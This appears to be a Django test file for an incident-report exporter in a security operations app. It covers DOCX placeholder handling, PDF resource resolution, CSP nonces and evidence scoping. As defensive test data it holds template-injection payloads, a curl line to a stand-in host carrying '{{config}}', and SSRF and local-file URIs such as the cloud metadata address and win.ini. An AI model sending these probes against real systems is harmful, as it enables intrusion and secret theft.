"""Report export robustness: ticket text is data, never template, and the page
it renders on keeps its script working under the CSP."""

import re
import tempfile

from django.test import override_settings
from django.urls import reverse
from docx import Document

from apps.accounts.models import UserProfile
from apps.accounts.testing import MFATestCase as TestCase
from apps.incidents.models import Ticket, TicketAttachment, TicketSubtask
from apps.incidents.reports import (
    _replace_placeholders,
    build_ticket_report_render_context,
    _resolve_pdf_resource,
    generate_ticket_report,
)
from apps.incidents.tests import (
    _docx_text, _make_redteam_manager, _make_t1, _make_ticket, _make_user, _png_upload,
)


class DocxPlaceholderTest(TestCase):
    def setUp(self):
        self.t1 = _make_t1('report_t1')

    def _ticket(self, **kwargs):
        return _make_ticket(
            created_by=self.t1,
            classification=Ticket.CLASSIFICATION_INCIDENT,
            severity='High',
            **kwargs,
        )

    def test_placeholder_syntax_in_ticket_text_is_printed_literally(self):
        """A captured SSTI payload is ordinary evidence text. It used to either
        fail the export ("unresolved placeholder") or pull in another field."""
        ticket = self._ticket(
            issue_description='Payload seen: {{7*7}} and {{signoff_approver}}',
            ioc_command='curl http://x/?q={{config}}',
        )
        text = _docx_text(generate_ticket_report(ticket.pk).content)
        self.assertIn('Payload seen: {{7*7}} and {{signoff_approver}}', text)
        self.assertIn('curl http://x/?q={{config}}', text)

    def test_control_characters_from_pasted_logs_do_not_fail_the_export(self):
        # PostgreSQL itself refuses NUL, so these are the ones that get stored.
        ticket = self._ticket(
            issue_description='ANSI \x1b[31mred\x1b[0m, a bell\x07 and a VT\x0b tab',
        )
        text = _docx_text(generate_ticket_report(ticket.pk).content)
        self.assertIn('ANSI [31mred[0m, a bell and a VT tab', text)

    def test_template_placeholder_without_a_value_still_fails_loudly(self):
        doc = Document()
        doc.add_paragraph().add_run('Known {{known}} and {{missing}}')
        with self.assertRaisesMessage(ValueError, '{{missing}}'):
            _replace_placeholders(doc, {'known': 'x'})

    def test_placeholder_split_across_runs_still_fails_loudly(self):
        doc = Document()
        paragraph = doc.add_paragraph()
        paragraph.add_run('{{kno')
        paragraph.add_run('wn}}')
        with self.assertRaisesMessage(ValueError, '{{known}}'):
            _replace_placeholders(doc, {'known': 'x'})


class PdfResourceResolverTest(TestCase):
    def test_only_inline_data_uris_are_resolved(self):
        data_uri = 'data:image/png;base64,AAAA'
        self.assertEqual(_resolve_pdf_resource(data_uri, None), data_uri)
        for uri in (
            'http://169.254.169.254/latest/meta-data/',
            'https://example.test/logo.png',
            'file:///C:/Windows/win.ini',
            '/static/css/app.css',
        ):
            with self.subTest(uri=uri):
                self.assertEqual(_resolve_pdf_resource(uri, None), '')


class ReportPreviewCspTest(TestCase):
    def setUp(self):
        self.manager = _make_user('report_mgr', UserProfile.ROLE_SOC_MANAGER)
        self.ticket = _make_ticket(classification=Ticket.CLASSIFICATION_INCIDENT)
        self.client.force_login(self.manager)

    def test_auto_apply_script_carries_the_csp_nonce(self):
        """script-src is nonce-only, so the checkbox auto-submit was blocked."""
        response = self.client.get(reverse('ticket_report_preview', args=[self.ticket.pk]))
        self.assertEqual(response.status_code, 200)
        nonce = re.search(r"'nonce-([^']+)'", response['Content-Security-Policy']).group(1)
        self.assertIn(f'<script nonce="{nonce}">', response.content.decode())

    def test_script_src_names_exact_cdn_files_not_the_whole_host(self):
        response = self.client.get(reverse('ticket_report_preview', args=[self.ticket.pk]))
        script_src = next(
            directive for directive in response['Content-Security-Policy'].split(';')
            if directive.strip().startswith('script-src')
        ).split()
        self.assertNotIn('https://cdn.jsdelivr.net', script_src)
        self.assertIn(
            'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js',
            script_src,
        )


@override_settings(MEDIA_ROOT=tempfile.mkdtemp(prefix='soc_report_media_'))
class ReportEvidenceScopeTest(TestCase):
    """Section 5 embeds the incident's own evidence. A response-request
    deliverable is a separate report and stays with its request."""

    def test_deliverable_images_are_not_embedded(self):
        redteam = _make_redteam_manager('scope_report_redteam')
        ticket = _make_ticket(classification=Ticket.CLASSIFICATION_INCIDENT)
        request = TicketSubtask.objects.create(
            ticket=ticket, subtask_type=TicketSubtask.TYPE_VA_PT,
            title='VA/PT', assigned_to=redteam,
        )
        TicketAttachment.objects.create(
            ticket=ticket, file=_png_upload('own.png'), original_name='own.png',
            description='analyst screenshot',
        )
        TicketAttachment.objects.create(
            ticket=ticket, subtask=request, file=_png_upload('scan.png'),
            original_name='scan.png', description='vapt finding',
        )

        context = build_ticket_report_render_context(Ticket.objects.get(pk=ticket.pk))
        evidence = next(
            row for section in context['sections'] for row in section['rows']
            if row['type'] == 'evidence'
        )
        self.assertEqual([image.caption for image in evidence['images']], ['analyst screenshot'])
